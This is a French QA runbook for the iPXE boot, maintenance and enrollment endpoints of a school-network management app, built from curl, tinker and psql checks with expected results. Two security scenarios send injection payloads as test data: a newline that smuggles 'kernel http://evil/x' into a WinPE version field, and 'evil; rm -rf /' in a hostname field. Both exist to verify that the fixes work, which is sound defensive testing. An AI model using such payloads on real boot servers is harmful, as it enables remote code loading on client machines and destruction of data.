# QA manuel — Domaine iPXE — Boot réseau & Déploiement OS

> Runbook E2E pour les stories du domaine iPXE (Epic 3). Append-only :
> chaque story ajoute une section avec ses scénarios numérotés stables.

**Pré-requis** :

- VM accessible : `ssh -i ~/.ssh/id_se4fs_vm root@192.168.122.50`
- Migrations à jour : `cd /var/www/sambaedu-reload && php artisan migrate`
- Composer à jour : `composer install --no-dev --optimize-autoloader`
- Apache (ou nginx) actif : `systemctl is-active apache2`
- Cache reset après deploy : `php artisan config:cache && php artisan route:cache && php artisan view:cache`
- Channel log `ipxe` créé : `ls -la storage/logs/ipxe/` (créé automatiquement
  au premier boot par `IpxeServiceProvider`)

---

## Story 3.1 — iPXE Service Core

**Date livraison** : 2026-05-19
**Migrations à appliquer** : aucune (D12 — réutilisation `MachineBootLog` existant)
**Permissions requises** : aucune (un firmware iPXE n'a pas de credentials —
sécurité = `auth.v1.lan-only` réutilisé de 16.11)

### Section 1 — Endpoint natif `/ipxe/boot` (handshake + résolution)

#### Scénario 3.1-1 — Premier appel iPXE (handshake, sans paramètres)

```bash
curl -sS http://192.168.122.50/ipxe/boot
```

**Attendu** :

- Status 200
- Header `Content-Type: text/plain; charset=utf-8`
- Header `Cache-Control: no-store`
- Header `X-Robots-Tag: noindex`
- Body commence par :
  ```
  #!ipxe
  params
  param mac ${net0/mac}
  param uuid ${uuid}
  param product ${product}
  chain --replace --autofree boot##params
   || sleep 10
  ```

**Vérification log** :

```bash
tail -n 5 storage/logs/ipxe/ipxe-$(date +%F).log
# Attendu : ligne `ipxe.boot.handshake` avec context {ip, user_agent}
```

#### Scénario 3.1-2 — Appel iPXE avec MAC connue (poste seed via tinker)

```bash
# 1. Seed une Workstation de test
php artisan tinker
> App\Models\Workstation::create([
    'name' => 'PC-TEST-101',
    'uuid' => '12345678-1234-1234-1234-123456789abc',
    'mac' => 'aa:bb:cc:dd:ee:ff',
    'status' => 'active',
  ]);
> exit

# 2. Appel iPXE simulé
curl -sS -X POST http://192.168.122.50/ipxe/boot \
  -d 'mac=aa:bb:cc:dd:ee:ff&uuid=12345678-1234-1234-1234-123456789abc&product=OptiPlex 3050'
```

**Attendu** :

- Status 200
- Body contient `PC-TEST-101` dans le titre du menu
- Body contient `item --key 1 login`
- Body contient `item --key 3 default`
- Body contient `:default` puis `iseq ${platform} efi`

#### Scénario 3.1-3 — Appel iPXE avec UUID connu (sans MAC matchante)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/boot \
  -d 'mac=00:00:00:00:00:00&uuid=12345678-1234-1234-1234-123456789abc&product=OptiPlex 3050'
```

**Attendu** :

- Status 200, body contient `PC-TEST-101` — la priorité UUID a fonctionné
  malgré MAC `00:00:00:00:00:00` non-matchante.

#### Scénario 3.1-4 — Appel iPXE avec MAC+UUID inconnus (poste inconnu)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/boot \
  -d 'mac=99:99:99:99:99:99&uuid=99999999-9999-9999-9999-999999999999&product=Unknown'
```

**Attendu** :

- Status 200
- Body contient `item --key 0 exit (0) Quitter iPXE et booter le disque dur`
- Body NE contient PAS `item --key 1 login` (= menu default, poste inconnu)
- Log channel `ipxe` : event `ipxe.boot.unknown_workstation`

### Section 2 — Sécurité LAN-only

#### Scénario 3.1-5 — Rejet IP publique (test depuis 8.8.8.8 simulé)

> **Fix review #9** — le précédent snippet `tinker` ne créait qu'un objet
> Request sans invoquer le middleware, donc ne démontrait rien. La validation
> automatisée fiable passe par le test Feature dédié.

**Méthode canonique (recommandée)** — exécuter le test Feature qui couvre
l'intégralité du flow middleware :

```bash
# Sur la VM (ou en local si vendor/ présent) :
php artisan test tests/Feature/Ipxe/IpxeEnsureLanIpTest.php
```

Le test simule des appels depuis IPs publiques (`8.8.8.8`, `1.2.3.4`) et
vérifie la réponse 403 + le code d'erreur. C'est la seule méthode fiable —
le middleware Laravel `auth.v1.lan-only` ne s'exécute que dans le pipeline
HTTP complet.

**Méthode alternative en prod (smoke réel)** — depuis une machine externe au
LAN scolaire (e.g. un VPS, un poste 4G mobile) :

```bash
curl -sS -i -X POST https://$SE4FS_HOST/ipxe/boot -d 'mac=aa:bb:cc:dd:ee:ff'
```

**Attendu** :

- Réponse 403 + JSON `{success:false, error:"forbidden", code:"bootstrap.not_lan"}`
- Log channel `auth-v1` : event `auth.bootstrap.lan_blocked`

### Section 3 — Non-régression catchall legacy

#### Scénario 3.1-6 — `/ipxe/admin.php` reste servi par le catchall

```bash
curl -sS -o /dev/null -w "%{http_code}\n" http://192.168.122.50/ipxe/admin.php
# Attendu : 200 (ou 302 vers login) — la page legacy est servie
```

**Vérification DB** :

```bash
sudo -u postgres psql -d sambaedu -c "SELECT id, method, path FROM legacy_catchall_logs WHERE path LIKE '%ipxe/admin.php%' ORDER BY id DESC LIMIT 1;"
# Attendu : row récente
```

#### Scénario 3.1-7 — `/ipxe/boot` ne génère PAS de row legacy_catchall_logs

```bash
curl -sS http://192.168.122.50/ipxe/boot > /dev/null
sudo -u postgres psql -d sambaedu -c "SELECT count(*) FROM legacy_catchall_logs WHERE path LIKE '%ipxe/boot%' AND created_at > now() - interval '1 minute';"
# Attendu : 0 — la route native court-circuite le catchall
```

### Section 4 — Persistance MachineBootLog

#### Scénario 3.1-8 — `MachineBootLog` peuplé à chaque call (sauf handshake)

```bash
sudo -u postgres psql -d sambaedu -c "
SELECT id, workstation_id, machine_name, action, initiated_by, success, started_at
FROM machine_boot_logs
WHERE action = 'ipxe_boot'
ORDER BY id DESC
LIMIT 5;
"
```

**Attendu** : rows avec
- `action='ipxe_boot'`
- `initiated_by='ipxe'`
- `success=true`
- `workstation_id` non-null pour poste connu, null pour inconnu
- `machine_name` lowercased pour poste connu (ex. `pc-test-101`), `unknown:<ip>`
  pour poste inconnu

### Section 5 — Smoke poste réel (optionnel — action Henri)

#### Scénario 3.1-9 — Boot PXE depuis un poste de test

1. Brancher un poste de test sur le LAN scolaire (192.168.x.y).
2. Configurer en BIOS : PXE boot prioritaire.
3. Rebooter le poste.

**Attendu** :

- Le firmware iPXE affiche le menu rendu par `/ipxe/boot`.
- Si le poste est seedé en base avec sa MAC/UUID → menu `known` (3 items :
  login, default, action conditionnel).
- Sinon → menu `default` (1 seul item : exit/boot disk).
- Choisir option 0 (Quitter iPXE et booter le disque dur) → boot disque
  local normal.
- Une row `MachineBootLog` `action='ipxe_boot'` est créée.

---

## Story 3.2 — Boot et Menu Admin iPXE

**Date livraison** : 2026-05-19
**Migrations à appliquer** : aucune (D12 — extension valeurs `MachineBootLog.action` sans CHECK)
**Permissions requises** : aucune (parité 3.1 — `auth.v1.lan-only` seul)

### Section 6 — Endpoint natif `/ipxe/admin`

#### Scénario 3.2-1 — Handshake `/ipxe/admin` (sans params)

```bash
curl -sS http://192.168.122.50/ipxe/admin
```

**Attendu** :

- Status 200
- Header `Content-Type: text/plain; charset=utf-8`
- Body commence par :
  ```
  #!ipxe
  params
  param mac ${net0/mac}
  param uuid ${uuid}
  param product ${product}
  chain --replace --autofree admin##params
   || sleep 10
  ```

**Vérification log** :

```bash
tail -n 1 storage/logs/ipxe/ipxe-$(date +%F).log
```
Attendu : event `ipxe.admin.handshake` avec `ip=<ton ip>`.

#### Scénario 3.2-2 — Menu admin pour poste connu

Pré-requis : créer la fixture via tinker.

```bash
php artisan tinker --execute="App\Models\Workstation::create(['name'=>'pc-test-32-1','mac'=>'aa:bb:cc:dd:ee:01','uuid'=>'12345678-1234-1234-1234-aaaaaaaaaaaa','status'=>'active']);"
```

```bash
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&product=OptiPlex 3050'
```

**Attendu** :

- Status 200
- Body contient :
  - `menu Preboot eXecution Environment pour pc-test-32-1`
  - `item --key m maintenance (m) Outils de maintenance`
  - `item --key r retour`
  - `item --key x exit`
  - `chain --replace --autofree http://192.168.122.50/ipxe/maintenance##params`

#### Scénario 3.2-3 — Menu admin pour poste inconnu

```bash
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=00:00:00:00:00:00&uuid=00000000-0000-0000-0000-000000000000'
```

**Attendu** :

- Status 200
- Body contient `Poste non enregistre`, `Story 3.3` (placeholder enrollment).
- **Absence** d'item `item --key m maintenance`.
- Items présents : `item --key x exit` + `item --key r retour`.

### Section 7 — Endpoint natif `/ipxe/maintenance`

#### Scénario 3.2-4 — Handshake `/ipxe/maintenance`

```bash
curl -sS http://192.168.122.50/ipxe/maintenance
```

**Attendu** : body contient `chain --replace --autofree maintenance##params`.

#### Scénario 3.2-5 — Menu maintenance complet

```bash
curl -sS -X POST http://192.168.122.50/ipxe/maintenance \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Attendu** :

- Status 200
- Body contient :
  - `item --key c rescuecd (c) Utilisation de SystemRescueCD`
  - `item --key w winpe (w) Reparation Windows (WinPE)`
  - `item --key f factory_reset (f) ATTENTION - Restauration usine`
  - `item --key s shell`
  - `item --key r retour` (chain vers `/ipxe/admin`)
  - `item --key x exit`

### Section 8 — Endpoint natif `/ipxe/action/{action}` + whitelist

#### Scénario 3.2-6 — Action `rescuecd` (port natif `actions/rescuecd.php`)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/rescuecd \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Attendu** :

- Status 200
- Body contient :
  - `kernel http://192.168.122.50/ipxe/sysresccd/boot/x86_64/vmlinuz`
  - `archisobasedir=sysresccd`
  - `rootpass=...` (valeur de `config('sambaedu.se4install_passwd')`)
  - 3 `initrd --name` (intel_ucode, amd_ucode, initram.igz)
  - Se termine par `boot\n`.

#### Scénario 3.2-7 — Action `winpe` (port natif `actions/winpe.php`)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/winpe \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Attendu** : body contient `kernel Win10/wimboot`, 2 blocs `params`, 6 lignes `initrd --name` (winpeshl.ini, install.bat, diskpart.txt, BCD, boot.sdi, boot.wim), 2 occurrences de `iseq ${platform} efi && param bios uefi || param bios legacy`.

#### Scénario 3.2-8 — Action `factory_reset` (port natif `clz_rest_sda2_sur_sda1.php`)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/factory_reset \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Attendu** : body contient `kernel http://192.168.122.50/ipxe/clonezilla/vmlinuz`, `ocs_prerun="mount -t auto /dev/sda2`, `ocs_live_run="ocs-sr -e1 auto -e2 -r -j2 -p reboot restoreparts savesda1 sda1"`, `fetch=http://192.168.122.50/ipxe/clonezilla/filesystem.squashfs`.

#### Scénario 3.2-9 — Action inconnue → 404 + log warning

```bash
curl -sS -o /dev/null -w "%{http_code}\n" http://192.168.122.50/ipxe/action/install_macos
```

**Attendu** : `404`.

```bash
tail -n 1 storage/logs/ipxe/ipxe-$(date +%F).log
```
Attendu : event `ipxe.action.unknown_action` avec `action_requested='install_macos'`.

### Section 9 — Non-régression catchall + MachineBootLog

#### Scénario 3.2-10 — `/ipxe/admin.php` continue d'être servi par le catchall legacy

```bash
curl -sS -o /dev/null -w "%{http_code}\n" http://192.168.122.50/ipxe/admin.php
```

**Attendu** : 200 (servi par le catchall — discrimination par extension `.php`).

```bash
sudo -u postgres psql -d sambaedu -c "SELECT path FROM legacy_catchall_logs WHERE path LIKE '%ipxe/admin.php%' ORDER BY id DESC LIMIT 3;"
```
Attendu : au moins une row récente.

#### Scénario 3.2-11 — Bascule menu `known` 3.1 → admin natif 3.2

```bash
curl -sS -X POST http://192.168.122.50/ipxe/boot \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&product=OptiPlex 3050'
```

**Attendu** : body contient `chain --replace --autofree http://192.168.122.50/ipxe/admin##params` (sans `.php`).

#### Scénario 3.2-12 — MachineBootLog peuplé pour les 3 endpoints

```bash
sudo -u postgres psql -d sambaedu -c "
SELECT action, initiated_by, machine_name, started_at
FROM machine_boot_logs
WHERE action IN ('ipxe_admin', 'ipxe_maintenance', 'ipxe_action')
ORDER BY id DESC LIMIT 10;
"
```

**Attendu** : rows avec actions `ipxe_admin`/`ipxe_maintenance`/`ipxe_action`. Pour `ipxe_action`, `initiated_by` au format `ipxe:rescuecd`, `ipxe:winpe` ou `ipxe:factory_reset`.

### Section 10 — Smoke poste réel (optionnel — action Henri)

#### Scénario 3.2-13 — Boot PXE → menu admin natif → rescue

1. Brancher un poste de test sur le LAN.
2. Configurer PXE boot prioritaire en BIOS.
3. Rebooter le poste → menu `known` iPXE.
4. Choisir option `1` (login) → menu admin natif.
5. Choisir `m` (maintenance) → menu maintenance natif.
6. Choisir `c` (rescuecd) → boot SystemRescueCD réel.

**⚠️ NE PAS** tester `factory_reset` sur un poste de prod sans backup (destructif).

Vérifier :
- Logs `storage/logs/ipxe/ipxe-$(date +%F).log` : événements `ipxe.admin.menu_rendered`, `ipxe.maintenance.menu_rendered`, `ipxe.action.dispatched`.
- 3 rows MachineBootLog correspondantes.

---

### Section 11 — Post-correctifs & non-régressions 3.2 (review 2026-05-19)

**Contexte** : 8 corrections appliquées suite à la code-review adversariale (cf.
`_bmad-output/codeReviews/3-2.md`). 3 incidents critiques corrigés à
re-tester explicitement sur la VM.

#### Tableau des incidents couverts

| # | Incident corrigé | Sévérité | Scénario QA |
|---|---|---|---|
| #1 | Bloc `params` (mac/uuid) absent dans `admin.blade.php` et `maintenance.blade.php` → MachineBootLog audit cassé sur chains internes (`unknown:<ip>`) | 🔴 | **Scénario 3.2-14** |
| #2 | `$version` winpe non sanitisé — newline injection iPXE (`version=Win11\nkernel http://evil/x`) | 🔴 | **Scénario 3.2-15** |
| #3 (Q1 Henri) | `factory_reset` sans log warning dédié — pas d'alerte SIEM possible sur action destructive | 🟠 | **Scénario 3.2-16** |

#### Scénario 3.2-14 — Bloc `params` injecté dans menus admin/maintenance (fix #1)

**Objectif** : vérifier que la navigation chainée admin → maintenance →
action propage bien `mac`/`uuid` (parité iso-legacy `admin.php:69-74` +
`maintenance.php:19-22`).

```bash
# 1. Curl menu admin connu, vérifier présence bloc params en tête.
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:ff&uuid=12345678-1234-1234-1234-123456789abc' \
  | head -10

# Attendu :
# #!ipxe
# params
# param mac aa:bb:cc:dd:ee:ff
# param uuid 12345678-1234-1234-1234-123456789abc
# console --x 1024 --y 768 --picture png/ipxe-se4.png
# :menu
# ...

# 2. Idem menu maintenance.
curl -sS -X POST http://192.168.122.50/ipxe/maintenance \
  -d 'mac=aa:bb:cc:dd:ee:ff&uuid=12345678-1234-1234-1234-123456789abc' \
  | head -10

# 3. Vérifier MachineBootLog : machine_name doit être celui du poste connu
#    (pas 'unknown:<ip>') après une chain interne admin → maintenance →
#    action depuis un poste réel ou simulé via curl séquentiel.
ssh /vm
psql sambaedu_reload -c "SELECT machine_name, action, initiated_by FROM machine_boot_logs WHERE created_at > NOW() - INTERVAL '5 minutes' ORDER BY id DESC LIMIT 10;"
# Attendu : machine_name = nom poste (PC-XXX), pas 'unknown:<ip>' tant que mac/uuid sont propagés via params.
```

**Critères d'acceptation** :
- Body admin commence par `#!ipxe\nparams\nparam mac <mac>\nparam uuid <uuid>\n`.
- Body maintenance idem.
- Aucune row MachineBootLog avec `machine_name='unknown:<ip>'` pour un poste qui était `known` au handshake initial.

#### Scénario 3.2-15 — Whitelist `$version` winpe (fix #2 / Q2 Henri)

**Objectif** : prouver qu'une tentative d'injection iPXE via newline dans
`version` POST est rejetée (FormRequest 422 OU fallback Win11 — défense en
profondeur).

```bash
# 1. POST winpe avec injection newline → attendre 422 (FormRequest Rule::in)
#    OU fallback Win11 (defense in depth resolver).
curl -sS -X POST http://192.168.122.50/ipxe/action/winpe \
  -d 'mac=aa:bb:cc:dd:ee:fe&uuid=eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee&version=Win11%0Akernel%20http://evil/x' \
  -o /tmp/winpe.out
cat /tmp/winpe.out

# Attendu (cas 1 — FormRequest 422 sans `Accept: application/json`) :
#   redirect 302 (form-encoded sans Accept JSON) OU
#   200 avec body fallback Win11 pur.

# Vérification CRITIQUE :
grep -q 'kernel http://evil' /tmp/winpe.out && echo "❌ INJECTION REUSSIE — BUG" || echo "✅ Pas d'injection"
grep -c 'Win11' /tmp/winpe.out  # Doit retourner ≥ 4 (BCD + boot.wim + param version + initrd).
grep -c 'http://evil' /tmp/winpe.out  # Doit retourner 0.

# 2. POST winpe avec version=Win10 (whitelist OK) → 200 body propage Win10.
curl -sS -X POST http://192.168.122.50/ipxe/action/winpe \
  -d 'mac=aa:bb:cc:dd:ee:fe&uuid=eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee&version=Win10' \
  | grep -E '(param version|initrd --name BCD|initrd --name boot.wim)'
# Attendu : 3 lignes contenant `Win10` pur.
```

**Critères d'acceptation** :
- `grep 'kernel http://evil' /tmp/winpe.out` retourne 0 occurrence.
- Body fallback contient `Win11` (config `DEFAULT_WIN_VERSION`).
- Whitelist Win10 propagée correctement.

#### Scénario 3.2-16 — Log warning factory_reset (fix #3 / Q1 Henri)

**Objectif** : vérifier que toute action `factory_reset` émet un event
warning dédié grep-able pour SIEM/alerting.

```bash
# 1. Déclencher factory_reset sur un poste de test (préférablement sans
#    disque ou avec backup — l'event est émis avant l'exécution Clonezilla).
ssh /vm
tail -F /var/www/sambaedu-reload/storage/logs/ipxe/ipxe-$(date +%F).log &
TAIL_PID=$!

curl -sS -X POST http://192.168.122.50/ipxe/action/factory_reset \
  -d 'mac=aa:bb:cc:dd:ee:fa&uuid=fafafafa-fafa-fafa-fafa-fafafafafafa'

sleep 1
kill $TAIL_PID

# 2. Grep le warning dans le log.
grep 'ipxe.action.factory_reset_dispatched' /var/www/sambaedu-reload/storage/logs/ipxe/ipxe-$(date +%F).log

# Attendu : ≥ 1 ligne niveau `warning` avec mac_prefix/uuid_prefix tronqués
#           (6/8 chars iso AC7.3), ip, workstation_id.
# Exemple :
#   [2026-05-19 14:32:11] ipxe.WARNING: ipxe.action.factory_reset_dispatched
#     {"action_type":"ipxe.action.factory_reset_dispatched","ip":"192.168.1.42",
#      "mac_prefix":"aa:bb:","uuid_prefix":"fafafafa","workstation_id":42}

# 3. Vérifier qu'une action NON-factory_reset NE DÉCLENCHE PAS le warning.
curl -sS -X POST http://192.168.122.50/ipxe/action/rescuecd \
  -d 'mac=aa:bb:cc:dd:ee:fb&uuid=fbfbfbfb-fbfb-fbfb-fbfb-fbfbfbfbfbfb'

# Le grep ne doit pas trouver de NOUVELLE ligne factory_reset_dispatched.
grep -c 'ipxe.action.factory_reset_dispatched' /var/www/sambaedu-reload/storage/logs/ipxe/ipxe-$(date +%F).log
# Attendu : compteur stable (uniquement les factory_reset précédents).
```

**Critères d'acceptation** :
- Au moins 1 event `ipxe.action.factory_reset_dispatched` niveau `warning` dans le log channel `ipxe` après chaque dispatch factory_reset.
- Préfixes PII (mac/uuid) tronqués 6/8 chars (anti-fuite AC7.3).
- Aucun event sur rescuecd ou winpe.

---

## Story 3.3 — Enrollment Machine — Parcs, Salles, Nommage

**Date livraison** : 2026-05-20
**Migrations à appliquer** : aucune (D9 — réutilisation `Workstation` / `WorkstationGroup` / `MachineBootLog` existants ; 5 nouvelles valeurs `action` ≤16 chars passent dans `varchar(20)` sans CHECK)
**Permissions requises** : aucune (cf. Story 3.1/3.2 — `auth.v1.lan-only` seul)
**Décision D14 retenue** : `AdMachineManager::renameComputer()` = plan B = **delete+recreate** (samba-tool computer move ne supporte que le déplacement OU). Conséquence : `netbootGUID` est perdu côté ancien compte → le service `WorkstationEnrollmentService::enrollName()` cas RENAMED ne re-register pas automatiquement le netbootGUID sur le nouveau nom — TODO documenté pour Story 3.4 si nécessaire (en pratique le rename est rare dans le flow iPXE).

### Section 12 — Endpoints natifs `/ipxe/enrollment/*`

#### Scénario 3.3-1 — Handshake `/ipxe/enrollment/name` (sans paramètres)

```bash
curl -sS http://192.168.122.50/ipxe/enrollment/name
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body commence par `#!ipxe`.
- Contient `chain --replace --autofree ipxe/enrollment/name##params` (handshake `IpxeMenuRenderer::renderHandshake('ipxe/enrollment/name')`).
- Headers : `Cache-Control: no-store`, `X-Robots-Tag: noindex`.

#### Scénario 3.3-2 — Saisie nom — poste neuf (création AD + DB)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/enrollment/name \
  -d 'mac=aa:bb:cc:dd:ee:99&uuid=12345678-1234-1234-1234-000000000099&new_name=pc-test-33-1&platform=legacy'
```

**Critères d'acceptation** :
- Body contient `echo OK ! nom pc-test-33-1 reserve pour 12345678-1234-1234-1234-000000000099`.
- Body contient `chain --replace --autofree http://192.168.122.50/ipxe/admin##params`.
- PostgreSQL :
  ```bash
  sudo -u postgres psql -d sambaedu -c \
    "SELECT id, name, uuid, mac FROM workstations WHERE uuid='12345678-1234-1234-1234-000000000099';"
  ```
  → 1 ligne avec `name=pc-test-33-1`.
- AD :
  ```bash
  samba-tool computer show pc-test-33-1
  ```
  → succès (compte machine créé).
- `MachineBootLog` : row avec `action='ipxe_enroll_name'`, `initiated_by='ipxe'`.
- Log channel `ipxe` : event `ipxe.enrollment.name.success` avec `status='created'` + `ad_result='success'`.

#### Scénario 3.3-3 — Saisie nom — même nom déjà enregistré (idempotent)

```bash
# Réutilise le poste seedé scénario 3.3-2.
curl -sS -X POST http://192.168.122.50/ipxe/enrollment/name \
  -d 'mac=aa:bb:cc:dd:ee:99&uuid=12345678-1234-1234-1234-000000000099&new_name=pc-test-33-1&platform=legacy'
```

**Critères d'acceptation** :
- Body contient `echo La machine est deja enregistree sous ce nom pc-test-33-1`.
- Pas de nouvel appel `samba-tool` (vérifier `auth.log` côté AD).
- PostgreSQL : aucun changement (`updated_at` inchangé).

#### Scénario 3.3-4 — Saisie nom — nom déjà pris par un autre poste

```bash
curl -sS -X POST http://192.168.122.50/ipxe/enrollment/name \
  -d 'mac=aa:bb:cc:dd:ee:88&uuid=12345678-1234-1234-1234-000000000088&new_name=pc-test-33-1&platform=legacy'
```

**Critères d'acceptation** :
- Body contient `echo ERREUR ! nom pc-test-33-1 indisponible: nom deja pris`.
- PostgreSQL : aucune nouvelle Workstation pour l'UUID `...088`.
- AD : pas de nouveau compte machine.
- Log channel `ipxe` : event `ipxe.enrollment.name.name_taken` niveau `warning`.

#### Scénario 3.3-5 — Saisie nom — renommage (UUID connu, nouveau nom libre)

```bash
# Pré-condition : poste pc-test-33-1 existe (scénario 3.3-2). On le renomme.
curl -sS -X POST http://192.168.122.50/ipxe/enrollment/name \
  -d 'mac=aa:bb:cc:dd:ee:99&uuid=12345678-1234-1234-1234-000000000099&new_name=pc-renamed-33-1&platform=legacy'
```

**Critères d'acceptation** :
- Body contient `echo OK ! nom pc-renamed-33-1 reserve pour ...`.
- PostgreSQL : `name='pc-renamed-33-1'` (UPDATE, pas INSERT — id inchangé).
- AD : ancien compte `pc-test-33-1` supprimé (plan B D14), nouveau `pc-renamed-33-1` créé.
- Log channel `ipxe` : event `ipxe.enrollment.name.success` avec `status='renamed'`.

> **Fenêtre temporelle AD rename (~1-2s)** : `renameComputer()` plan B (delete+recreate) crée une fenêtre pendant laquelle ni l'ancien ni le nouveau compte AD n'existent. Tout poste qui tente bind LDAP / auth Kerberos sur l'ancien nom durant cette fenêtre échouera. **Recommandation opérationnelle** : effectuer les renommages hors heures de boot massif (avant 8h ou après 17h).

#### Scénario 3.3-6 — Affectation salle (poste connu)

```bash
# Pré-condition : seed une salle physique en base.
sudo -u postgres psql -d sambaedu -c \
  "INSERT INTO workstation_groups (name, is_physical, is_active, created_at, updated_at) VALUES ('salle-test-33-A', true, true, NOW(), NOW()) RETURNING id;"

ROOM_ID=42  # remplacer par l'id renvoyé

curl -sS -X POST http://192.168.122.50/ipxe/enrollment/room \
  -d "mac=aa:bb:cc:dd:ee:99&uuid=12345678-1234-1234-1234-000000000099&room=${ROOM_ID}"
```

**Critères d'acceptation** :
- Body contient `echo La machine a ete ajoutee a la salle salle-test-33-A`.
- PostgreSQL : `workstations.physical_room_id = ${ROOM_ID}` pour le poste.
- Observer `WorkstationObserver` déclenché → job `WorkstationMembershipAdSyncJob` ou équivalent dispatché (vérifier `php artisan queue:work --once`).
- Log channel `ipxe` : event `ipxe.enrollment.room.success`.

#### Scénario 3.3-7 — Affectation salle — poste inconnu

```bash
curl -sS -X POST http://192.168.122.50/ipxe/enrollment/room \
  -d 'mac=00:00:00:00:00:00&uuid=00000000-0000-0000-0000-000000000000&room=1'
```

**Critères d'acceptation** :
- Body contient `echo Erreur - poste non encore enregistre.`
- Body contient `chain --replace --autofree http://192.168.122.50/ipxe/admin##params`.
- PostgreSQL : aucune création.

#### Scénario 3.3-8 — Ajout à un parc logique (poste connu)

```bash
sudo -u postgres psql -d sambaedu -c \
  "INSERT INTO workstation_groups (name, is_physical, is_active, created_at, updated_at) VALUES ('parc-test-33-X', false, true, NOW(), NOW()) RETURNING id;"

PARC_ID=43  # remplacer

curl -sS -X POST http://192.168.122.50/ipxe/enrollment/parc-add \
  -d "mac=aa:bb:cc:dd:ee:99&uuid=12345678-1234-1234-1234-000000000099&parc=${PARC_ID}"
```

**Critères d'acceptation** :
- Body contient `echo La machine a ete ajoutee au parc parc-test-33-X`.
- PostgreSQL : row dans `workstation_group_workstation` avec `workstation_id` et `workstation_group_id=${PARC_ID}`.
- Log channel `ipxe` : event `ipxe.enrollment.parc.added`.

#### Scénario 3.3-9 — Retrait d'un parc logique (poste connu)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/enrollment/parc-remove \
  -d "mac=aa:bb:cc:dd:ee:99&uuid=12345678-1234-1234-1234-000000000099&parc=${PARC_ID}"
```

**Critères d'acceptation** :
- Body contient `echo La machine a ete enlevee du parc parc-test-33-X`.
- PostgreSQL : row supprimée de `workstation_group_workstation`.
- Log channel `ipxe` : event `ipxe.enrollment.parc.removed`.

#### Scénario 3.3-10 — Anti-injection nom (sécurité)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/enrollment/name \
  -d "mac=aa:bb:cc:dd:ee:99&uuid=12345678-1234-1234-1234-000000000099&new_name=evil%3B%20rm%20-rf%20%2F"
```

**Critères d'acceptation** :
- HTTP 200 (pas 422 — un firmware iPXE doit recevoir un menu).
- Body contient `echo ERREUR` + `nom invalide` (ou variante).
- Body **ne contient PAS** `rm -rf` (sanitize).
- PostgreSQL : aucune Workstation créée pour `new_name=evil...`.
- AD : aucun nouveau compte.
- Log channel `ipxe` : event `ipxe.enrollment.name.rejected_invalid` (warning) avec `reason=invalid_hostname` + `attempted_name_prefix` tronqué (renommé post-review 3.3 F7 — vs `name_taken` pré-correctif).

#### Scénario 3.3-11 — Non-régression menu admin natif (3.2 → 3.3)

```bash
# Poste connu — vérifier les items enrollment activés.
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:99&uuid=12345678-1234-1234-1234-000000000099'

# Poste inconnu — vérifier l'item set-name (au lieu du message neutre 3.2).
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=00:00:00:00:00:00&uuid=00000000-0000-0000-0000-000000000000'
```

**Critères d'acceptation** (poste connu) :
- Body contient `item --key n set-name` (Story 3.3).
- Body contient `item --key a salle` + `item --key p parcs` + `item --key e enleveparc` (Story 3.3).
- Body contient `item --key m maintenance` (non-régression 3.2).
- Sections de chain `:set-name`, `:salle`, `:parcs`, `:enleveparc` présentes.

**Critères d'acceptation** (poste inconnu) :
- Body contient `item --key n set-name` (au lieu du message neutre 3.2).
- Body ne contient PAS `item --key m maintenance`.
- Body contient `chain --replace --autofree http://192.168.122.50/ipxe/enrollment/name##params`.

#### Scénario 3.3-12 — Non-régression catchall legacy `/ipxe/enregistrement.php`

```bash
curl -sS http://192.168.122.50/ipxe/enregistrement.php | head -20
# Idem pour /ipxe/salles.php, /ipxe/parcs.php, /ipxe/enleveparc.php, /ipxe/enregistrement_byod.php
```

**Critères d'acceptation** :
- 200 servi par le catchall legacy (= row insérée dans `legacy_catchall_logs`).
- Body legacy PHP procédural (ancien format `#!ipxe\nconsole ... param mac ...`).
- Non-régression : les routes legacy `.php` continuent jusqu'à la Story 3.7 cleanup.

#### Scénario 3.3-13 — `MachineBootLog` peuplé pour les 5 endpoints enrollment

```bash
# Après quelques appels aux scénarios 3.3-2/6/8/9 et un BYOD :
curl -sS -X POST http://192.168.122.50/ipxe/enrollment/byod \
  -d 'mac=aa:bb:cc:dd:ee:bb&uuid=bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb&new_name=student-pc'

sudo -u postgres psql -d sambaedu -c \
  "SELECT action, machine_name, initiated_by, success, started_at FROM machine_boot_logs WHERE action LIKE 'ipxe_enroll%' OR action LIKE 'ipxe_parc%' ORDER BY id DESC LIMIT 10;"
```

**Critères d'acceptation** :
- Au moins 5 rows distinctes avec actions :
  - `ipxe_enroll_name` (scénario 3.3-2/5)
  - `ipxe_enroll_byod` (scénario BYOD ci-dessus)
  - `ipxe_enroll_room` (scénario 3.3-6)
  - `ipxe_parc_add` (scénario 3.3-8)
  - `ipxe_parc_remove` (scénario 3.3-9)
- `initiated_by='ipxe'` pour tous.
- `success=true` (sauf si AD échoue → reste true côté DB mais event log warning).
